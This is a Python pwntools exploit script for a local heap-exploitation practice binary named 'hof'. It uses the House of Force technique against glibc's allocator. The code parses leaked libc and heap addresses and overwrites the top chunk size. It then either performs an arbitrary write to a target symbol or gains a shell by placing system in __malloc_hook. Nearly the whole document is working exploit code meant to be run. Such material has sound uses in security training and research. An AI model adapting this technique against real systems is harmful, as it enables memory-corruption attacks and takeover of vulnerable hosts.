#!/usr/bin/python3
from pwn import *

"""
This script can run both the arbitrary write and the rce exploits.

To run the arbitrary write with GDB:
python3 exploit.py GDB

To run RCE with GDB:
python3 exploit.py SHELL GDB

To run RCE with the libc string pointer and GDB:
python3 exploit.py SHELL LIBC GDB
"""


elf = context.binary = ELF("./hof")
# elf = context.binary = ELF("./house_of_force_working")
libc = elf.libc

gs = '''

continue
'''
# This function starts the binary with or without gdb attached.
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# This function calls the malloc function inside the binary and should be called when the process is in the main menu. 
def helper_malloc(size, data):
    # Choose the malloc option.
    r.send("1")
    # Receive untill Size: and then send the size.
    r.sendafter("size: ", str(size))
    # Receive untill data: and then send the size.
    r.sendafter("data: ", data)
    # Receive until we are back in the main menu.
    r.recvuntil("> ")

# This function calculates the distance of pointers *Before* our heap address.
def helper_distance(x, y):
    return (0xffffffffffffffff - x) + y

# Start the process.
r = start()

# Receive the leaked puts address.
r.recvuntil("puts() @ ")
# Calculate the libc address
libc.address = int(r.recvline(), 16) - libc.sym.puts

# Receive the leaked heap address.
r.recvuntil("heap @ ")
heap = int(r.recvline(), 16)

# Receive untill we are back in the main menu.
r.recvuntil("> ")
r.timeout = 0.1

# Display the leaked values
log.info(f"heap: 0x{heap:02x}")
log.info(f"target: 0x{elf.sym.target:02x}")

# Overwrite the top chunk with 0xffffffffffffffff & write /bin/sh to the first chunk
helper_malloc(24, b"/bin/sh\0"+ b"A"*16 + p64(0xffffffffffffffff))


if args.SHELL:
    # Gain remote code execution.

    # Calculate the distance to just before __malloc_hook.
    distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
    
    if args.LIBC:
        # Execute System with the libc pointer of /bin/sh.
        helper_malloc(distance, "b")
        # Write System to the __malloc_hook.
        helper_malloc(24, p64(libc.sym.system))
        # Search for the pointer to the binsh string.
        binsh = next(libc.search(b"/bin/sh"))
        # Execute system with the binsh string.
        helper_malloc(binsh, "")
    else:
        # Execute System with /bin/sh inside the heap chunk.
        # Write /bin/sh\0 to othe second chunk with a size of just before __malloc_hook.
        helper_malloc(distance ,"C")
        # helper_malloc(distance, "/bin/sh\0")
        # Write System to the __malloc_hook.
        helper_malloc(24, p64(libc.sym.system))
        print(hex(libc.sym.system))
        # Execute System with the pointer to the first chunk.
        helper_malloc(heap+0x10,"")
else:
    # Calculate the distance to the target.
    distance = helper_distance(heap + 0x20, elf.sym.target - 0x20)
    # Make a big chunk that spans that distance
    helper_malloc(distance, "B")
    # overwrite our target.
    helper_malloc(1, "WOTWOT wins again")

# Get an interactive shell on the process.
r.interactive()
